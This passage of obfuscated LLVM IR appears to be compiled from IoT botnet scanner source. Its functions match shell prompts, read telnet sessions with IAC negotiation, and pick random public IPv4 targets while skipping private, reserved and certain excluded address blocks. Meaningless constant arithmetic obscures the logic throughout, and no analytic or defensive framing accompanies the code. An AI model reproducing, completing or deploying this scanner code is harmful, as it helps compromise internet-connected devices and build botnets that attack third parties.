  br label %52

; <label>:52:                                     ; preds = %44, %36
  br label %53

; <label>:53:                                     ; preds = %52, %29
  br label %54

; <label>:54:                                     ; preds = %53, %22
  %55 = load i32, i32* %5, align 4
  %56 = call i64 @send(i32 %55, i8* %8, i64 1, i32 16384)
  %57 = load i32, i32* %5, align 4
  %58 = load i8*, i8** %6, align 8
  %59 = getelementptr inbounds i8, i8* %58, i64 2
  %60 = call i64 @send(i32 %57, i8* %59, i64 1, i32 16384)
  br label %62

; <label>:61:                                     ; preds = %3
  br label %62

; <label>:62:                                     ; preds = %61, %54
  store i32 0, i32* %4, align 4
  br label %63

; <label>:63:                                     ; preds = %62, %13
  %64 = load i32, i32* %4, align 4
  ret i32 %64
}

; Function Attrs: noinline nounwind uwtable
define i32 @matchPrompt(i8*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.45, i32 0, i32 0), i8** %4, align 8
  %8 = load i8*, i8** %3, align 8
  %9 = call i64 @strlen(i8* %8) #10
  %10 = trunc i64 %9 to i32
  store i32 %10, i32* %5, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %6, align 4
  br label %11

; <label>:11:                                     ; preds = %113, %1
  %12 = load i32, i32* %6, align 4
  %13 = sext i32 %12 to i64
  %14 = load i8*, i8** %4, align 8
  %15 = call i64 @strlen(i8* %14) #10
  %16 = icmp ult i64 %13, %15
  br i1 %16, label %17, label %120

; <label>:17:                                     ; preds = %11
  br label %18

; <label>:18:                                     ; preds = %85, %17
  %19 = load i32, i32* %5, align 4
  %20 = load i32, i32* %7, align 4
  %21 = icmp sgt i32 %19, %20
  br i1 %21, label %22, label %83

; <label>:22:                                     ; preds = %18
  %23 = load i8*, i8** %3, align 8
  %24 = load i32, i32* %5, align 4
  %25 = sext i32 %24 to i64
  %26 = getelementptr inbounds i8, i8* %23, i64 %25
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = sub i64 0, %28
  %30 = add i64 0, %29
  %31 = sub i64 0, %28
  %32 = getelementptr inbounds i8, i8* %26, i64 %30
  %33 = load i8, i8* %32, align 1
  %34 = sext i8 %33 to i32
  %35 = icmp eq i32 %34, 0
  br i1 %35, label %81, label %36

; <label>:36:                                     ; preds = %22
  %37 = load i8*, i8** %3, align 8
  %38 = load i32, i32* %5, align 4
  %39 = sext i32 %38 to i64
  %40 = getelementptr inbounds i8, i8* %37, i64 %39
  %41 = load i32, i32* %7, align 4
  %42 = sext i32 %41 to i64
  %43 = add i64 0, 1980646129666538896
  %44 = sub i64 %43, %42
  %45 = sub i64 %44, 1980646129666538896
  %46 = sub i64 0, %42
  %47 = getelementptr inbounds i8, i8* %40, i64 %45
  %48 = load i8, i8* %47, align 1
  %49 = sext i8 %48 to i32
  %50 = icmp eq i32 %49, 32
  br i1 %50, label %81, label %51

; <label>:51:                                     ; preds = %36
  %52 = load i8*, i8** %3, align 8
  %53 = load i32, i32* %5, align 4
  %54 = sext i32 %53 to i64
  %55 = getelementptr inbounds i8, i8* %52, i64 %54
  %56 = load i32, i32* %7, align 4
  %57 = sext i32 %56 to i64
  %58 = sub i64 0, -1377300687332664332
  %59 = sub i64 %58, %57
  %60 = add i64 %59, -1377300687332664332
  %61 = sub i64 0, %57
  %62 = getelementptr inbounds i8, i8* %55, i64 %60
  %63 = load i8, i8* %62, align 1
  %64 = sext i8 %63 to i32
  %65 = icmp eq i32 %64, 13
  br i1 %65, label %81, label %66

; <label>:66:                                     ; preds = %51
  %67 = load i8*, i8** %3, align 8
  %68 = load i32, i32* %5, align 4
  %69 = sext i32 %68 to i64
  %70 = getelementptr inbounds i8, i8* %67, i64 %69
  %71 = load i32, i32* %7, align 4
  %72 = sext i32 %71 to i64
  %73 = add i64 0, 6888417437491553664
  %74 = sub i64 %73, %72
  %75 = sub i64 %74, 6888417437491553664
  %76 = sub i64 0, %72
  %77 = getelementptr inbounds i8, i8* %70, i64 %75
  %78 = load i8, i8* %77, align 1
  %79 = sext i8 %78 to i32
  %80 = icmp eq i32 %79, 10
  br label %81

; <label>:81:                                     ; preds = %66, %51, %36, %22
  %82 = phi i1 [ true, %51 ], [ true, %36 ], [ true, %22 ], [ %80, %66 ]
  br label %83

; <label>:83:                                     ; preds = %81, %18
  %84 = phi i1 [ false, %18 ], [ %82, %81 ]
  br i1 %84, label %85, label %90

; <label>:85:                                     ; preds = %83
  %86 = load i32, i32* %7, align 4
  %87 = sub i32 0, 1
  %88 = sub i32 %86, %87
  %89 = add nsw i32 %86, 1
  store i32 %88, i32* %7, align 4
  br label %18

; <label>:90:                                     ; preds = %83
  %91 = load i8*, i8** %3, align 8
  %92 = load i32, i32* %5, align 4
  %93 = sext i32 %92 to i64
  %94 = getelementptr inbounds i8, i8* %91, i64 %93
  %95 = load i32, i32* %7, align 4
  %96 = sext i32 %95 to i64
  %97 = add i64 0, 3514910437066336458
  %98 = sub i64 %97, %96
  %99 = sub i64 %98, 3514910437066336458
  %100 = sub i64 0, %96
  %101 = getelementptr inbounds i8, i8* %94, i64 %99
  %102 = load i8, i8* %101, align 1
  %103 = sext i8 %102 to i32
  %104 = load i8*, i8** %4, align 8
  %105 = load i32, i32* %6, align 4
  %106 = sext i32 %105 to i64
  %107 = getelementptr inbounds i8, i8* %104, i64 %106
  %108 = load i8, i8* %107, align 1
  %109 = sext i8 %108 to i32
  %110 = icmp eq i32 %103, %109
  br i1 %110, label %111, label %112

; <label>:111:                                    ; preds = %90
  store i32 1, i32* %2, align 4
  br label %121

; <label>:112:                                    ; preds = %90
  br label %113

; <label>:113:                                    ; preds = %112
  %114 = load i32, i32* %6, align 4
  %115 = sub i32 0, %114
  %116 = sub i32 0, 1
  %117 = add i32 %115, %116
  %118 = sub i32 0, %117
  %119 = add nsw i32 %114, 1
  store i32 %118, i32* %6, align 4
  br label %11

; <label>:120:                                    ; preds = %11
  store i32 0, i32* %2, align 4
  br label %121

; <label>:121:                                    ; preds = %120, %111
  %122 = load i32, i32* %2, align 4
  ret i32 %122
}

; Function Attrs: noinline nounwind uwtable
define i32 @readUntil(i32, i8*, i32, i32, i32, i8*, i32, i32) #0 {
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca %struct.__sigset_t, align 8
  %22 = alloca %struct.timeval, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  store i32 %0, i32* %10, align 4
  store i8* %1, i8** %11, align 8
  store i32 %2, i32* %12, align 4
  store i32 %3, i32* %13, align 4
  store i32 %4, i32* %14, align 4
  store i8* %5, i8** %15, align 8
  store i32 %6, i32* %16, align 4
  store i32 %7, i32* %17, align 4
  %26 = load i32, i32* %17, align 4
  store i32 %26, i32* %18, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %27 = load i32, i32* %13, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 0
  store i64 %28, i64* %29, align 8
  %30 = load i32, i32* %14, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 1
  store i64 %31, i64* %32, align 8
  store i8* null, i8** %23, align 8
  br label %33

; <label>:33:                                     ; preds = %163, %8
  %34 = load i32, i32* %18, align 4
  %35 = add i32 %34, -1003185396
  %36 = add i32 %35, 2
  %37 = sub i32 %36, -1003185396
  %38 = add nsw i32 %34, 2
  %39 = load i32, i32* %16, align 4
  %40 = icmp slt i32 %37, %39
  br i1 %40, label %41, label %51

; <label>:41:                                     ; preds = %33
  %42 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 0
  %43 = load i64, i64* %42, align 8
  %44 = icmp sgt i64 %43, 0
  br i1 %44, label %49, label %45

; <label>:45:                                     ; preds = %41
  %46 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 1
  %47 = load i64, i64* %46, align 8
  %48 = icmp sgt i64 %47, 0
  br label %49

; <label>:49:                                     ; preds = %45, %41
  %50 = phi i1 [ true, %41 ], [ %48, %45 ]
  br label %51

; <label>:51:                                     ; preds = %49, %33
  %52 = phi i1 [ false, %33 ], [ %50, %49 ]
  br i1 %52, label %53, label %164

; <label>:53:                                     ; preds = %51
  br label %54

; <label>:54:                                     ; preds = %53
  %55 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %21, i32 0, i32 0
  %56 = getelementptr inbounds [16 x i64], [16 x i64]* %55, i64 0, i64 0
  %57 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %56) #2, !srcloc !4
  %58 = extractvalue { i64, i64* } %57, 0
  %59 = extractvalue { i64, i64* } %57, 1
  %60 = trunc i64 %58 to i32
  store i32 %60, i32* %24, align 4
  %61 = ptrtoint i64* %59 to i64
  %62 = trunc i64 %61 to i32
  store i32 %62, i32* %25, align 4
  br label %63

; <label>:63:                                     ; preds = %54
  %64 = load i32, i32* %10, align 4
  %65 = srem i32 %64, 64
  %66 = zext i32 %65 to i64
  %67 = shl i64 1, %66
  %68 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %21, i32 0, i32 0
  %69 = load i32, i32* %10, align 4
  %70 = sdiv i32 %69, 64
  %71 = sext i32 %70 to i64
  %72 = getelementptr inbounds [16 x i64], [16 x i64]* %68, i64 0, i64 %71
  %73 = load i64, i64* %72, align 8
  %74 = xor i64 %73, -1
  %75 = xor i64 %67, -1
  %76 = xor i64 2669731799720216086, -1
  %77 = and i64 %74, 2669731799720216086
  %78 = and i64 %73, %76
  %79 = and i64 %75, 2669731799720216086
  %80 = and i64 %67, %76
  %81 = or i64 %77, %78
  %82 = or i64 %79, %80
  %83 = xor i64 %81, %82
  %84 = or i64 %74, %75
  %85 = xor i64 %84, -1
  %86 = or i64 2669731799720216086, %76
  %87 = and i64 %85, %86
  %88 = or i64 %83, %87
  %89 = or i64 %73, %67
  store i64 %88, i64* %72, align 8
  %90 = load i32, i32* %10, align 4
  %91 = sub i32 %90, 595917842
  %92 = add i32 %91, 1
  %93 = add i32 %92, 595917842
  %94 = add nsw i32 %90, 1
  %95 = call i32 @select(i32 %93, %struct.__sigset_t* %21, %struct.__sigset_t* null, %struct.__sigset_t* null, %struct.timeval* %22)
  %96 = icmp slt i32 %95, 1
  br i1 %96, label %97, label %98

; <label>:97:                                     ; preds = %63
  br label %164

; <label>:98:                                     ; preds = %63
  %99 = load i8*, i8** %15, align 8
  %100 = load i32, i32* %18, align 4
  %101 = sext i32 %100 to i64
  %102 = getelementptr inbounds i8, i8* %99, i64 %101
  store i8* %102, i8** %23, align 8
  %103 = load i32, i32* %10, align 4
  %104 = load i8*, i8** %23, align 8
  %105 = call i64 @recv(i32 %103, i8* %104, i64 1, i32 0)
  %106 = trunc i64 %105 to i32
  store i32 %106, i32* %19, align 4
  %107 = load i32, i32* %19, align 4
  %108 = icmp eq i32 %107, -1
  br i1 %108, label %112, label %109

; <label>:109:                                    ; preds = %98
  %110 = load i32, i32* %19, align 4
  %111 = icmp eq i32 %110, 0
  br i1 %111, label %112, label %113

; <label>:112:                                    ; preds = %109, %98
  store i32 0, i32* %9, align 4
  br label %169

; <label>:113:                                    ; preds = %109
  %114 = load i32, i32* %19, align 4
  %115 = load i32, i32* %18, align 4
  %116 = add i32 %115, 1916982147
  %117 = add i32 %116, %114
  %118 = sub i32 %117, 1916982147
  %119 = add nsw i32 %115, %114
  store i32 %118, i32* %18, align 4
  %120 = load i8*, i8** %23, align 8
  %121 = load i8, i8* %120, align 1
  %122 = zext i8 %121 to i32
  %123 = icmp eq i32 %122, 255
  br i1 %123, label %124, label %149

; <label>:124:                                    ; preds = %113
  %125 = load i32, i32* %10, align 4
  %126 = load i8*, i8** %23, align 8
  %127 = getelementptr inbounds i8, i8* %126, i64 1
  %128 = call i64 @recv(i32 %125, i8* %127, i64 2, i32 0)
  %129 = trunc i64 %128 to i32
  store i32 %129, i32* %19, align 4
  %130 = load i32, i32* %19, align 4
  %131 = icmp eq i32 %130, -1
  br i1 %131, label %135, label %132

; <label>:132:                                    ; preds = %124
  %133 = load i32, i32* %19, align 4
  %134 = icmp eq i32 %133, 0
  br i1 %134, label %135, label %136

; <label>:135:                                    ; preds = %132, %124
  store i32 0, i32* %9, align 4
  br label %169

; <label>:136:                                    ; preds = %132
  %137 = load i32, i32* %19, align 4
  %138 = load i32, i32* %18, align 4
  %139 = sub i32 %138, -1224419774
  %140 = add i32 %139, %137
  %141 = add i32 %140, -1224419774
  %142 = add nsw i32 %138, %137
  store i32 %141, i32* %18, align 4
  %143 = load i32, i32* %10, align 4
  %144 = load i8*, i8** %23, align 8
  %145 = call i32 @negotiate(i32 %143, i8* %144, i32 3)
  %146 = icmp ne i32 %145, 0
  br i1 %146, label %148, label %147

; <label>:147:                                    ; preds = %136
  store i32 0, i32* %9, align 4
  br label %169

; <label>:148:                                    ; preds = %136
  br label %163

; <label>:149:                                    ; preds = %113
  %150 = load i8*, i8** %15, align 8
  %151 = load i8*, i8** %11, align 8
  %152 = call i8* @strstr(i8* %150, i8* %151) #10
  %153 = icmp ne i8* %152, null
  br i1 %153, label %161, label %154

; <label>:154:                                    ; preds = %149
  %155 = load i32, i32* %12, align 4
  %156 = icmp ne i32 %155, 0
  br i1 %156, label %157, label %162

; <label>:157:                                    ; preds = %154
  %158 = load i8*, i8** %15, align 8
  %159 = call i32 @matchPrompt(i8* %158)
  %160 = icmp ne i32 %159, 0
  br i1 %160, label %161, label %162

; <label>:161:                                    ; preds = %157, %149
  store i32 1, i32* %20, align 4
  br label %164

; <label>:162:                                    ; preds = %157, %154
  br label %163

; <label>:163:                                    ; preds = %162, %148
  br label %33

; <label>:164:                                    ; preds = %161, %97, %51
  %165 = load i32, i32* %20, align 4
  %166 = icmp ne i32 %165, 0
  br i1 %166, label %167, label %168

; <label>:167:                                    ; preds = %164
  store i32 1, i32* %9, align 4
  br label %169

; <label>:168:                                    ; preds = %164
  store i32 0, i32* %9, align 4
  br label %169

; <label>:169:                                    ; preds = %168, %167, %147, %135, %112
  %170 = load i32, i32* %9, align 4
  ret i32 %170
}

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomPublicIP() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [16 x i8], align 16
  %3 = alloca [16 x i8], align 16
  %4 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %5 = zext i8 %4 to i32
  %6 = icmp sgt i32 %5, 0
  br i1 %6, label %7, label %31

; <label>:7:                                      ; preds = %0
  %8 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %9 = zext i8 %8 to i32
  %10 = icmp slt i32 %9, 255
  br i1 %10, label %11, label %31

; <label>:11:                                     ; preds = %7
  %12 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %13 = sub i8 0, %12
  %14 = sub i8 0, 1
  %15 = add i8 %13, %14
  %16 = sub i8 0, %15
  %17 = add i8 %12, 1
  store i8 %16, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %18 = bitcast [16 x i8]* %2 to i8*
  call void @llvm.memset.p0i8.i64(i8* %18, i8 0, i64 16, i32 16, i1 false)
  %19 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %20 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %21 = zext i8 %20 to i32
  %22 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %23 = zext i8 %22 to i32
  %24 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %25 = zext i8 %24 to i32
  %26 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %27 = zext i8 %26 to i32
  %28 = call i32 (i8*, i8*, ...) @szprintf(i8* %19, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.46, i32 0, i32 0), i32 %21, i32 %23, i32 %25, i32 %27)
  %29 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %30 = call i32 @inet_addr(i8* %29) #2
  store i32 %30, i32* %1, align 4
  br label %569

; <label>:31:                                     ; preds = %7, %0
  %32 = call i32 @rand() #2
  %33 = srem i32 %32, 255
  %34 = trunc i32 %33 to i8
  store i8 %34, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %35 = call i32 @rand() #2
  %36 = srem i32 %35, 255
  %37 = trunc i32 %36 to i8
  store i8 %37, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %38 = call i32 @rand() #2
  %39 = srem i32 %38, 255
  %40 = trunc i32 %39 to i8
  store i8 %40, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %41 = call i32 @rand() #2
  %42 = srem i32 %41, 255
  %43 = trunc i32 %42 to i8
  store i8 %43, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  br label %44

; <label>:44:                                     ; preds = %542, %31
  %45 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %46 = zext i8 %45 to i32
  %47 = icmp eq i32 %46, 0
  br i1 %47, label %540, label %48

; <label>:48:                                     ; preds = %44
  %49 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %50 = zext i8 %49 to i32
  %51 = icmp eq i32 %50, 10
  br i1 %51, label %540, label %52

; <label>:52:                                     ; preds = %48
  %53 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %54 = zext i8 %53 to i32
  %55 = icmp eq i32 %54, 100
  br i1 %55, label %56, label %64

; <label>:56:                                     ; preds = %52
  %57 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %58 = zext i8 %57 to i32
  %59 = icmp sge i32 %58, 64
  br i1 %59, label %60, label %64

; <label>:60:                                     ; preds = %56
  %61 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %62 = zext i8 %61 to i32
  %63 = icmp sle i32 %62, 127
  br i1 %63, label %540, label %64

; <label>:64:                                     ; preds = %60, %56, %52
  %65 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %66 = zext i8 %65 to i32
  %67 = icmp eq i32 %66, 127
  br i1 %67, label %540, label %68

; <label>:68:                                     ; preds = %64
  %69 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %70 = zext i8 %69 to i32
  %71 = icmp eq i32 %70, 169
  br i1 %71, label %72, label %76

; <label>:72:                                     ; preds = %68
  %73 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %74 = zext i8 %73 to i32
  %75 = icmp eq i32 %74, 254
  br i1 %75, label %540, label %76

; <label>:76:                                     ; preds = %72, %68
  %77 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %78 = zext i8 %77 to i32
  %79 = icmp eq i32 %78, 172
  br i1 %79, label %80, label %88

; <label>:80:                                     ; preds = %76
  %81 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %82 = zext i8 %81 to i32
  %83 = icmp sle i32 %82, 16
  br i1 %83, label %84, label %88

; <label>:84:                                     ; preds = %80
  %85 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %86 = zext i8 %85 to i32
  %87 = icmp sle i32 %86, 31
  br i1 %87, label %540, label %88

; <label>:88:                                     ; preds = %84, %80, %76
  %89 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %90 = zext i8 %89 to i32
  %91 = icmp eq i32 %90, 192
  br i1 %91, label %92, label %100

; <label>:92:                                     ; preds = %88
  %93 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %94 = zext i8 %93 to i32
  %95 = icmp eq i32 %94, 0
  br i1 %95, label %96, label %100

; <label>:96:                                     ; preds = %92
  %97 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %98 = zext i8 %97 to i32
  %99 = icmp eq i32 %98, 2
  br i1 %99, label %540, label %100

; <label>:100:                                    ; preds = %96, %92, %88
  %101 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %102 = zext i8 %101 to i32
  %103 = icmp eq i32 %102, 192
  br i1 %103, label %104, label %112

; <label>:104:                                    ; preds = %100
  %105 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %106 = zext i8 %105 to i32
  %107 = icmp eq i32 %106, 88
  br i1 %107, label %108, label %112

; <label>:108:                                    ; preds = %104
  %109 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %110 = zext i8 %109 to i32
  %111 = icmp eq i32 %110, 99
  br i1 %111, label %540, label %112

; <label>:112:                                    ; preds = %108, %104, %100
  %113 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %114 = zext i8 %113 to i32
  %115 = icmp eq i32 %114, 192
  br i1 %115, label %116, label %120

; <label>:116:                                    ; preds = %112
  %117 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %118 = zext i8 %117 to i32
  %119 = icmp eq i32 %118, 168
  br i1 %119, label %540, label %120

; <label>:120:                                    ; preds = %116, %112
  %121 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %122 = zext i8 %121 to i32
  %123 = icmp eq i32 %122, 198
  br i1 %123, label %124, label %132

; <label>:124:                                    ; preds = %120
  %125 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %126 = zext i8 %125 to i32
  %127 = icmp eq i32 %126, 18
  br i1 %127, label %540, label %128

; <label>:128:                                    ; preds = %124
  %129 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %130 = zext i8 %129 to i32
  %131 = icmp eq i32 %130, 19
  br i1 %131, label %540, label %132

; <label>:132:                                    ; preds = %128, %120
  %133 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %134 = zext i8 %133 to i32
  %135 = icmp eq i32 %134, 198
  br i1 %135, label %136, label %144

; <label>:136:                                    ; preds = %132
  %137 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %138 = zext i8 %137 to i32
  %139 = icmp eq i32 %138, 51
  br i1 %139, label %140, label %144

; <label>:140:                                    ; preds = %136
  %141 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %142 = zext i8 %141 to i32
  %143 = icmp eq i32 %142, 100
  br i1 %143, label %540, label %144

; <label>:144:                                    ; preds = %140, %136, %132
  %145 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %146 = zext i8 %145 to i32
  %147 = icmp eq i32 %146, 203
  br i1 %147, label %148, label %156

; <label>:148:                                    ; preds = %144
  %149 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %150 = zext i8 %149 to i32
  %151 = icmp eq i32 %150, 0
  br i1 %151, label %152, label %156

; <label>:152:                                    ; preds = %148
  %153 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %154 = zext i8 %153 to i32
  %155 = icmp eq i32 %154, 113
  br i1 %155, label %540, label %156

; <label>:156:                                    ; preds = %152, %148, %144
  %157 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %158 = zext i8 %157 to i32
  %159 = icmp eq i32 %158, 188
  br i1 %159, label %160, label %168

; <label>:160:                                    ; preds = %156
  %161 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %162 = zext i8 %161 to i32
  %163 = icmp eq i32 %162, 209
  br i1 %163, label %164, label %168

; <label>:164:                                    ; preds = %160
  %165 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %166 = zext i8 %165 to i32
  %167 = icmp eq i32 %166, 52
  br i1 %167, label %540, label %168

; <label>:168:                                    ; preds = %164, %160, %156
  %169 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %170 = zext i8 %169 to i32
  %171 = icmp eq i32 %170, 188
  br i1 %171, label %172, label %180

; <label>:172:                                    ; preds = %168
  %173 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %174 = zext i8 %173 to i32
  %175 = icmp eq i32 %174, 209
  br i1 %175, label %176, label %180

; <label>:176:                                    ; preds = %172
  %177 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %178 = zext i8 %177 to i32
  %179 = icmp eq i32 %178, 49
  br i1 %179, label %540, label %180

; <label>:180:                                    ; preds = %176, %172, %168
  %181 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %182 = zext i8 %181 to i32
  %183 = icmp eq i32 %182, 185
  br i1 %183, label %184, label %192

; <label>:184:                                    ; preds = %180
  %185 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %186 = zext i8 %185 to i32
  %187 = icmp eq i32 %186, 62
  br i1 %187, label %188, label %192

; <label>:188:                                    ; preds = %184
  %189 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %190 = zext i8 %189 to i32
  %191 = icmp eq i32 %190, 190
  br i1 %191, label %540, label %192

; <label>:192:                                    ; preds = %188, %184, %180
  %193 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %194 = zext i8 %193 to i32
  %195 = icmp eq i32 %194, 185
  br i1 %195, label %196, label %204

; <label>:196:                                    ; preds = %192
  %197 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %198 = zext i8 %197 to i32
  %199 = icmp eq i32 %198, 62
  br i1 %199, label %200, label %204

; <label>:200:                                    ; preds = %196
  %201 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %202 = zext i8 %201 to i32
  %203 = icmp eq i32 %202, 189
  br i1 %203, label %540, label %204

; <label>:204:                                    ; preds = %200, %196, %192
  %205 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %206 = zext i8 %205 to i32
  %207 = icmp eq i32 %206, 185
  br i1 %207, label %208, label %216

; <label>:208:                                    ; preds = %204
  %209 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %210 = zext i8 %209 to i32
  %211 = icmp eq i32 %210, 62
  br i1 %211, label %212, label %216

; <label>:212:                                    ; preds = %208
  %213 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %214 = zext i8 %213 to i32
  %215 = icmp eq i32 %214, 188
  br i1 %215, label %540, label %216

; <label>:216:                                    ; preds = %212, %208, %204
  %217 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %218 = zext i8 %217 to i32
  %219 = icmp eq i32 %218, 185
  br i1 %219, label %220, label %228

; <label>:220:                                    ; preds = %216
  %221 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %222 = zext i8 %221 to i32
  %223 = icmp eq i32 %222, 61
  br i1 %223, label %224, label %228

; <label>:224:                                    ; preds = %220
  %225 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %226 = zext i8 %225 to i32
  %227 = icmp eq i32 %226, 137
  br i1 %227, label %540, label %228

; <label>:228:                                    ; preds = %224, %220, %216
  %229 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %230 = zext i8 %229 to i32
